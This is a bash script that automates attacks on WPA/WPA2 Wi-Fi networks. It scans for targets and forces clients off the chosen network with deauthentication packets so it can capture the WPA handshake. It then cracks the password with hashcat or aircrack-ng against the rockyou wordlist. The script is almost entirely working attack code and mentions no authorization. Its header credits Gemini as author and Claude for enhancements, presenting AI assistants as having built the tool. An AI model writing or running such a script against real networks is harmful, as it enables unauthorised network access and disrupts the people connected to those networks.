#!/bin/bash

# ====================================================================================
# WPA/WPA2 Handshake Capture and Cracker Script
#
# A guided script to capture a WPA/WPA2 handshake and then attempt to crack it
# using a wordlist. Enhanced with airgeddon and hashcat support.
#
# Author: Gemini
# Enhanced: Claude (airgeddon + hashcat integration)
# ====================================================================================

# --- Configuration ---
# Wireless interface to use for the attack
ATTACK_IF="wlan1"

# Directory to save capture files and handshakes
CAPTURE_DIR="./handshakes"
mkdir -p $CAPTURE_DIR

# Path to your wordlist
WORDLIST_PATH="/usr/share/wordlists/rockyou.txt"

# Airgeddon path (if available)
AIRGEDDON_PATH="/opt/airgeddon/airgeddon.sh"

# Hashcat options
HASHCAT_OPTIONS="-m 22000 -a 0 --force"
HASHCAT_WORDLIST="/usr/share/wordlists/rockyou.txt"

# --- Script Functions ---

function cleanup() {
    echo "[*] Cleaning up..."
    # Kill any running airodump-ng or aireplay-ng processes
    killall airodump-ng 2>/dev/null
    killall aireplay-ng 2>/dev/null
    killall hashcat 2>/dev/null
    
    # Stop monitor mode
    airmon-ng stop ${ATTACK_IF}mon > /dev/null 2>&1
    
    echo "[*] Cleanup complete."
    exit 0
}

function check_tools() {
    echo "[*] Checking required tools..."
    
    # Check aircrack-ng suite
    if ! command -v aircrack-ng &> /dev/null; then
        echo "[!] aircrack-ng not found. Please install it first."
        exit 1
    fi
    
    # Check hashcat (optional but recommended)
    if command -v hashcat &> /dev/null; then
        echo "[+] hashcat found - will be used for faster cracking"
        HASHCAT_AVAILABLE=true
    else
        echo "[!] hashcat not found - will use aircrack-ng only"
        HASHCAT_AVAILABLE=false
    fi
    
    # Check airgeddon (optional)
    if [ -f "$AIRGEDDON_PATH" ]; then
        echo "[+] airgeddon found at $AIRGEDDON_PATH"
        AIRGEDDON_AVAILABLE=true
    else
        echo "[!] airgeddon not found at $AIRGEDDON_PATH - using manual mode"
        AIRGEDDON_AVAILABLE=false
    fi
}

function use_airgeddon() {
    echo "[*] Launching airgeddon for automated attack..."
    echo "[*] This will open airgeddon's interactive menu"
    echo "[*] Select option 5 (Handshake tools menu) > 6 (Capture Handshake) for automated capture"
    echo "[*] Or option 7 (Offline WPA/WPA2 decrypt menu) if you have a capture file"
    read -p "Press Enter to continue..."
    
    if [ -f "$AIRGEDDON_PATH" ]; then
        bash "$AIRGEDDON_PATH"
    else
        echo "[!] Airgeddon not found. Falling back to manual mode."
        return 1
    fi
}

function convert_to_hashcat() {
    local cap_file="$1"
    local output_file="$2"
    
    echo "[*] Converting capture to hashcat format..."
    
    # Use hcxpcapngtool if available, otherwise use aircrack-ng
    if command -v hcxpcapngtool &> /dev/null; then
        hcxpcapngtool -o "$output_file" "$cap_file"
    elif command -v hcxpcaptool &> /dev/null; then
        hcxpcaptool -z "$output_file" "$cap_file"
    else
        # Fallback to aircrack-ng PMKID/hccapx conversion
        aircrack-ng -J "${output_file%.*}" "$cap_file"
        if [ -f "${output_file%.*}.hccapx" ]; then
            mv "${output_file%.*}.hccapx" "$output_file"
        fi
    fi
    
    if [ -f "$output_file" ]; then
        echo "[+] Conversion successful: $output_file"
        return 0
    else
        echo "[!] Conversion failed"
        return 1
    fi
}

function crack_with_hashcat() {
    local hash_file="$1"
    local wordlist="$2"
    
    echo "[*] Starting hashcat attack..."
    echo "[*] Using mode 22000 (WPA-PBKDF2-PMKID+EAPOL)"
    
    # Run hashcat
    hashcat $HASHCAT_OPTIONS "$hash_file" "$wordlist"
    
    # Check if password was found
    if hashcat --show "$hash_file" 2>/dev/null | grep -q ":"; then
        echo "[+] Password found!"
        echo "[+] Results:"
        hashcat --show "$hash_file"
        return 0
    else
        echo "[!] Password not found with current wordlist"
        return 1
    fi
}

# Trap Ctrl+C and call cleanup
trap cleanup SIGINT

# --- Main Script ---

# Check for root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root." 
   exit 1
fi

# Check tools availability
check_tools

# Show menu for attack method
echo ""
echo "=== WiFi Cracking Tool ==="
echo "1. Use airgeddon (automated GUI-based attack)"
echo "2. Manual attack (original script mode)"
echo "3. Crack existing capture file"
echo ""
read -p "Select attack method [1-3]: " attack_method

case $attack_method in
    1)
        if [ "$AIRGEDDON_AVAILABLE" = true ]; then
            use_airgeddon
            exit 0
        else
            echo "[!] Airgeddon not available. Using manual mode."
            attack_method=2
        fi
        ;;
    3)
        echo "[*] Crack existing capture mode selected"
        read -p "Enter path to capture file (.cap/.pcap): " existing_cap
        if [ ! -f "$existing_cap" ]; then
            echo "[!] File not found: $existing_cap"
            exit 1
        fi
        
        # Try hashcat first if available
        if [ "$HASHCAT_AVAILABLE" = true ]; then
            hash_file="$CAPTURE_DIR/$(basename ${existing_cap%.*}).22000"
            if convert_to_hashcat "$existing_cap" "$hash_file"; then
                read -p "Enter wordlist path [default: $HASHCAT_WORDLIST]: " user_wordlist
                wordlist="${user_wordlist:-$HASHCAT_WORDLIST}"
                if crack_with_hashcat "$hash_file" "$wordlist"; then
                    exit 0
                fi
            fi
        fi
        
        # Fallback to aircrack-ng
        echo "[*] Using aircrack-ng for cracking..."
        read -p "Enter target BSSID: " crack_bssid
        read -p "Enter wordlist path [default: $WORDLIST_PATH]: " user_wordlist
        wordlist="${user_wordlist:-$WORDLIST_PATH}"
        aircrack-ng -w "$wordlist" -b "$crack_bssid" "$existing_cap"
        exit 0
        ;;
esac

# 1. Select Target Network
echo "[*] Starting monitor mode on $ATTACK_IF..."
airmon-ng check kill > /dev/null 2>&1
airmon-ng start $ATTACK_IF > /dev/null 2>&1
MONITOR_IF="${ATTACK_IF}mon"

echo "[*] Scanning for target networks for 15 seconds..."
airodump-ng --wps $MONITOR_IF &
AIRODUMP_PID=$!
sleep 15
kill $AIRODUMP_PID

# Display networks found (using the output from the previous command)
# Note: airodump-ng writes to a file, we'll just show the console output for selection
echo "[+] Please choose a target network from the list above."
read -p "Enter Target BSSID: " TARGET_BSSID
read -p "Enter Target Channel: " TARGET_CHANNEL

# 2. Capture Handshake
echo "[*] Targeting BSSID: $TARGET_BSSID on Channel: $TARGET_CHANNEL"
echo "[*] Listening for WPA handshake... Press Ctrl+C when you have captured a handshake."

# Start airodump-ng to capture the handshake
CAPTURE_FILE="$CAPTURE_DIR/capture_$(date +%s)"
airodump-ng --bssid $TARGET_BSSID -c $TARGET_CHANNEL -w $CAPTURE_FILE $MONITOR_IF &
AIRODUMP_CAPTURE_PID=$!

# 3. Deauthenticate a Client to Speed Up Handshake Capture
echo "[*] Waiting for a client to appear..."
# Loop until a client is found in the capture
CLIENT_MAC=""
while [ -z "$CLIENT_MAC" ]; do
    sleep 5
    # Grep the CSV file for a client associated with the target BSSID
    CLIENT_MAC=$(grep -A 5 "Station MAC" ${CAPTURE_FILE}-01.csv | grep "$TARGET_BSSID" | awk '{print $1}' | head -n 1)
done

echo "[+] Client $CLIENT_MAC found! Sending deauth packets..."
aireplay-ng --deauth 5 -a $TARGET_BSSID -c $CLIENT_MAC $MONITOR_IF

echo "[*] Deauth packets sent. Check the top right of the airodump-ng window for 'WPA handshake'."
echo "[*] Once captured, press Ctrl+C here to stop capturing and start cracking."

# Wait for user to stop the capture
wait $AIRODUMP_CAPTURE_PID

# 4. Crack the Handshake
HANDSHAKE_FILE="${CAPTURE_FILE}-01.cap"
if [ ! -f "$HANDSHAKE_FILE" ]; then
    echo "[!] Capture file not found. Exiting."
    cleanup
fi

echo "[*] Handshake capture file: $HANDSHAKE_FILE"
echo "[*] Checking if a handshake was captured..."

# Use aircrack-ng to check for a valid handshake
if ! aircrack-ng -J "$CAPTURE_DIR/handshake" "$HANDSHAKE_FILE" | grep -q "1 handshake(s)"; then
    echo "[!] No valid handshake found in the capture file. Try again."
    cleanup
fi

echo "[+] Valid handshake found!"
read -p "Do you want to start cracking now? (y/n): " choice
if [[ "$choice" != "y" ]]; then
    echo "[*] Cracking skipped. Handshake saved in $CAPTURE_DIR."
    cleanup
fi

# Try hashcat first if available
if [ "$HASHCAT_AVAILABLE" = true ]; then
    echo "[*] Attempting to crack with hashcat (faster)..."
    hash_file="$CAPTURE_DIR/$(basename ${HANDSHAKE_FILE%.*}).22000"
    
    if convert_to_hashcat "$HANDSHAKE_FILE" "$hash_file"; then
        read -p "Enter wordlist path [default: $HASHCAT_WORDLIST]: " user_wordlist
        wordlist="${user_wordlist:-$HASHCAT_WORDLIST}"
        
        if [ -f "$wordlist" ]; then
            if crack_with_hashcat "$hash_file" "$wordlist"; then
                echo "[+] Cracking finished successfully with hashcat."
                cleanup
            else
                echo "[*] Hashcat attempt failed. Trying aircrack-ng..."
            fi
        else
            echo "[!] Wordlist not found: $wordlist"
            echo "[*] Falling back to aircrack-ng with default wordlist"
        fi
    else
        echo "[*] Conversion failed. Using aircrack-ng..."
    fi
fi

# Fallback to aircrack-ng
echo "[*] Using aircrack-ng for cracking..."
read -p "Enter wordlist path [default: $WORDLIST_PATH]: " user_wordlist
wordlist="${user_wordlist:-$WORDLIST_PATH}"

if [ ! -f "$wordlist" ]; then
    echo "[!] Wordlist not found at: $wordlist"
    echo "[*] Please update the wordlist path."
    cleanup
fi

echo "[*] Starting cracking process with wordlist: $wordlist"
aircrack-ng -w "$wordlist" -b $TARGET_BSSID ${HANDSHAKE_FILE}

echo "[+] Cracking finished."
cleanup
